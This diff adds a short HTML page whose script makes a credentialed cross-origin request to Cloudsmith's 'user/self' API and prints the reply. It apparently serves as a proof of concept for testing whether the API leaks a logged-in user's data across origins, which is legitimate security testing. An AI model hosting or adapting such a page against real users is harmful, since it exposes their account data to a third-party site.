@@ -1,0 +1,16 @@
+<html>
+<body>
+<script>
+fetch("https://api.cloudsmith.io/user/self/", {
+    credentials: "include"
+})
+.then(r => r.text())
+.then(t => {
+    document.body.innerHTML = "<pre>" + t + "</pre>";
+})
+.catch(e => {
+    document.body.innerHTML = e;
+});
+</script>
+</body>
+</html>
